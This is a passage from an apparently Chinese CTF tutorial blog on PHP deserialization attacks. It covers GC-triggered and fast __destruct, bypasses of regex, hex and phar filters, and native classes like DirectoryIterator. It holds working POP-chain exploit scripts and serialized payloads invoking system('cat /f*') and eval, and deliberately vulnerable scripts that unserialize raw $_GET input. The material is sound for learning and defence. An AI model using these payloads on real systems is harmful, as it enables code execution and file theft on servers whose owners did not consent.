src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240312201642801.png" alt="image-20240312201642801"></p><p>仍然触发了__destruct</p><p>但若注销了<code>$c[0]=$c[1]</code>呢</p><p><img src="https://bu.dusays.com/2024/05/13/66416313d6b21.png" alt="image-20240312201830825"></p><p>如图 正常创建，最后销毁</p><p>当一个对象没有任何引用的时候，则会被视为“垃圾”，即</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a = new test();</span><br></pre></td></tr></table></figure><p>test 对象被 变量 a 引用， 所以该对象不是“垃圾”，而如果是这样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new test();</span><br><span class="line">或这样</span><br><span class="line"></span><br><span class="line">$a = new test();</span><br><span class="line">$a = 1;</span><br></pre></td></tr></table></figure><p>这样在 test 在没有被引用或在失去引用时便会被当作“垃圾”进行回收,触发__destruct。</p><p>这就是GC回收的大致理解</p><p>所以例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr0</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello __destruct&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$err</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello __toString&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;err-&gt;<span class="title function_ invoke__">flag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$err</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello __flag()&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;就这？&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>明显</p><p>首端 –&gt; <strong>errorr0::__destruct()</strong> –&gt; <strong>errorr1::__toString()</strong> –&gt; <strong>errorr2::flag()</strong> –&gt;尾巴。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr0</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;num = <span class="keyword">new</span> <span class="title function_ invoke__">errorr1</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$err</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;err = <span class="keyword">new</span> <span class="title function_ invoke__">errorr2</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$err</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">errorr0</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但是 如果没有这句**throw new Exception();<strong>就真的构造完了，但是有的话</strong>__destruct()<strong>是不会执行的，而</strong>__destruct()**不执行这条链子根本就是堵死的，没啥用</p><p>根据之前说的<strong>GC回收机制</strong>可以把一段数据当做垃圾回收，那不就可以执行**__destruct()<strong>，然后就有一个问题——-如何触发</strong>GC回收机制**？！！还记得，之前举过的例子吗？如过没有如何东西指向一个对象，那个对象就会被当作垃圾回收。所以，我们先看修改后的exp</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr0</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;num = <span class="keyword">new</span> <span class="title function_ invoke__">errorr1</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$err</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;err = <span class="keyword">new</span> <span class="title function_ invoke__">errorr2</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$err</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">errorr0</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="variable">$a</span>,<span class="number">1</span>=&gt;<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>明显</p><p>就加了一行代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$c = array(0=&gt;$a,1=&gt;NULL);</span><br><span class="line"></span><br><span class="line">$c = array(0=&gt;$a,1=&gt;0);  然后再改一下 如下 也可以</span><br></pre></td></tr></table></figure><p>把目标对象赋给键为0，键为1赋值为<strong>NULL</strong>。为什么要这么做，因为这样操作后，得到的字符串为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;i:0;O:7:&quot;errorr0&quot;:1:&#123;s:3:&quot;num&quot;;O:7:&quot;errorr1&quot;:1:&#123;s:3:&quot;err&quot;;O:7:&quot;errorr2&quot;:1:&#123;s:3:&quot;err&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&#125;i:1;N;&#125;</span><br><span class="line"></span><br><span class="line">a:2:&#123;i:0;O:7:&quot;errorr0&quot;:1:&#123;s:3:&quot;num&quot;;O:7:&quot;errorr1&quot;:1:&#123;s:3:&quot;err&quot;;O:7:&quot;errorr2&quot;:1:&#123;s:3:&quot;err&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&#125;i:1;i:0;&#125;  这是结果 但是只有还是不行  还要再改一下</span><br><span class="line">a:2:&#123;i:0;O:7:&quot;errorr0&quot;:1:&#123;s:3:&quot;num&quot;;O:7:&quot;errorr1&quot;:1:&#123;s:3:&quot;err&quot;;O:7:&quot;errorr2&quot;:1:&#123;s:3:&quot;err&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&#125;i:0;i:0;&#125;   将1改成0 就可以了 原理是一样的</span><br></pre></td></tr></table></figure><blockquote><p>第一个a为数组，2为数组中键有两个 i &#x3D; 0以及 i &#x3D; 1</p><p>重点重点重点，虽然有两个键i &#x3D; 0对应的是我们目标对象，i &#x3D; 1是NULL，如果这个时候我们做一件坏事，把i 本应该等于 1修改为 i &#x3D; 0。那不就是把i &#x3D; 0指向NULL了吗？然后就实现了GC回收。</p></blockquote><p>所以最后我们修改后的字符串为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;i:0;O:7:&quot;errorr0&quot;:1:&#123;s:3:&quot;num&quot;;O:7:&quot;errorr1&quot;:1:&#123;s:3:&quot;err&quot;;O:7:&quot;errorr2&quot;:1:&#123;s:3:&quot;err&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&#125;i:0;N;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641630ea11df.png" alt="image-20240312202655182"></p><p>成功</p><p>GC回收机制的利用需要修改字符串中的数据，如果phar反序列化+GC的话就还需要额外修改phar文件的签名，如果遇到的话就需要在修改序列化字符串后再对其进行加密得到的数据替换原本的签名。</p><h2 id="bypass绕过"><a href="#bypass绕过" class="headerlink" title="bypass绕过"></a>bypass绕过</h2><h3 id="wakeup绕过-1"><a href="#wakeup绕过-1" class="headerlink" title="__wakeup绕过"></a>__wakeup绕过</h3><p>见上文</p><h3 id="destruct绕过"><a href="#destruct绕过" class="headerlink" title="__destruct绕过"></a>__destruct绕过</h3><p>见上文 GC强制回收</p><p>快速触发__destruct</p><p>Fast destruct</p><p>1.修改序列化数字元素个数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;</span><br><span class="line">改成</span><br><span class="line">O:5:&quot;Start&quot;:2:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a0dd13fd7.png" alt="image-20240205180429122"></p><p>O:5:”Start”:2:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:7:”cat &#x2F;f*”;}}}}}</p><p><img src="https://bu.dusays.com/2024/05/13/6641630ea1d7a.png" alt="image-20240205180917410"></p><p>2.去掉序列化尾部 }</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;</span><br><span class="line">改成</span><br><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641630e5aba2.png" alt="image-20240205181044938"></p><p>O:5:”Start”:1:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:7:”cat &#x2F;f*”;}}}}</p><p><img src="https://bu.dusays.com/2024/05/13/6641630eda87b.png" alt="image-20240205181123821"></p><p>详见newstar web week4 morefast</p><h3 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h3><p>如preg_match(‘&#x2F;^O:\d+&#x2F;‘)匹配序列化字符串是否是对象字符串开头</p><ul><li><code>利用加号绕过（注意在url里传参时+要编码为%2B）。</code></li><li><code>利用数组对象绕过，如 serialize(array($a)); a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)。</code></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">match</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;nonono!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// +号绕过</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="keyword">match</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">// 将对象放入数组绕过 serialize(array($a));</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="引用绕过"><a href="#引用绕过" class="headerlink" title="引用绕过"></a>引用绕过</h3><p>见上文</p><h3 id="16进制绕过字符的过滤"><a href="#16进制绕过字符的过滤" class="headerlink" title="16进制绕过字符的过滤"></a>16进制绕过字符的过滤</h3><p>序列字符串中表示字符类型的s大写时，会被当成16进制解析</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/username/&#x27;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;nonono!!!&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 未作处理前，会被waf拦截</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// 将小s改为大S; 做处理后 \75是u的16进制， 成功绕过</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h3 id="phar的绕过"><a href="#phar的绕过" class="headerlink" title="phar的绕过"></a>phar的绕过</h3><p>当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2:&#x2F;&#x2F;和compress.zlib:&#x2F;&#x2F;等绕过。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br></pre></td></tr></table></figure><p>也可以利用其他协议</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=phar://phar.phar</span><br></pre></td></tr></table></figure><p>GIF格式验证可以通过在文件头部添加GIF89a绕过。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> $phar-&gt;setStub(“GIF89a”.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">//生成一个phar.phar，修改后缀名为phar.gif</span><br></pre></td></tr></table></figure><p>过滤了__HALT_COMPILER()</p><p>1.<strong>将phar文件进行gzip压缩</strong> ，使用压缩后phar文件同样也能反序列化 (常用)</p><p>2.将phar的内容写进压缩包注释中，也同样能够反序列化成功，压缩为zip也会绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$phar_file = serialize($exp);</span><br><span class="line">echo $phar_file;</span><br><span class="line">$zip = new ZipArchive();</span><br><span class="line">$res = $zip-&gt;open(&#x27;1.zip&#x27;,ZipArchive::CREATE);</span><br><span class="line">$zip-&gt;addFromString(&#x27;crispr.txt&#x27;, &#x27;file content goes here&#x27;);</span><br><span class="line">$zip-&gt;setArchiveComment($phar_file);</span><br><span class="line">$zip-&gt;close();</span><br></pre></td></tr></table></figure><h2 id="原生类"><a href="#原生类" class="headerlink" title="原生类"></a>原生类</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>PHP 原生类指的是 PHP 内置的类，它们可以直接在 PHP 代码中使用且无需安装或导入任何库，相当于代码中的内置方法例如echo ，print等等可以直接调用，但是原生类就是可以就直接php中直接创建的类，我们可以直接调用创建对象，但是这些类中有的会有魔术方法，为此，我们可以创建原生类去利用其中的魔术方法来达到我们反序列化的利用。</p><p>通过代码直接获取原生类和相关魔术方法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span>    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类</span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="https://bu.dusays.com/2024/05/13/6641631a7f108.png" alt="image-20240312220217278"></p><p>截不完</p><p>不同版本的PHP其中包含的原生类不同，为了使用到较全的php原生类，建议将php的版本调到7.0以上</p><h3 id="常用原生类使用"><a href="#常用原生类使用" class="headerlink" title="常用原生类使用"></a>常用原生类使用</h3><h4 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator()"></a>DirectoryIterator()</h4><p>使用DirectoryIterator()类可以遍历目录下的文件名</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$dir</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;<span class="comment">//不加__toString也可以，因为echo可以自动调用</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641631868f6f.png" alt="image-20240313195328587"></p><p>传入.&#x2F;就会查看到当前目录下的文件</p><p>同理使用..&#x2F;可以查看上级目录下的文件</p><p>使用绝对路径亦可以查看服务器指定目录下的文件目录</p><p><img src="https://bu.dusays.com/2024/05/13/6641631a3cfa0.png" alt="image-20240313195050576"></p><p>foreach是遍历目录关键</p><p>没有foreach就只遍历第一个字符</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$dir</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/66416316804ac.png" alt="image-20240313195401536"></p><p>回显.htaccess的.</p><p>也可以使用glob和file协议读取文件内容</p><p>glob:&#x2F;&#x2F;*.php</p><h4 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h4><p>FilesystemIterator是继承于DirectoryIterator的类，两者作用和用法基本相同，区别为FilesystemIterator会显示文件的完整路径，而DirectoryIterator只显示文件名</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;./&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">current</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="comment">//是$dir不是$f</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个foreach是继承的DirectoryIterator()的魔术方法__toString,</p><p>而第二个foreach是FilesystemIterator的为了达成上一个foreach的效果的魔术方法current()</p><p><img src="https://bu.dusays.com/2024/05/13/6641631ceee8d.png" alt="image-20240313200737925"></p><p>也可以使用glob协议</p><p><strong>在php4.3以后使用了<code>zend_class_unserialize_deny</code>来禁止一些类的反序列化，很不幸的是这两个原生类都在禁止名单当中</strong></p><h4 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a>GlobIterator</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="string">&quot;*.php&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与之前两个类的作用和使用方法类似，不同点在于其行为类似于glob(),可以通过模式匹配来寻找文件路径（前两个需要利用glob:&#x2F;&#x2F;协议才可以模式匹配）</p><p><img src="https://bu.dusays.com/2024/05/13/66416317e49f4.png" alt="image-20240313202150331"></p><h4 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" 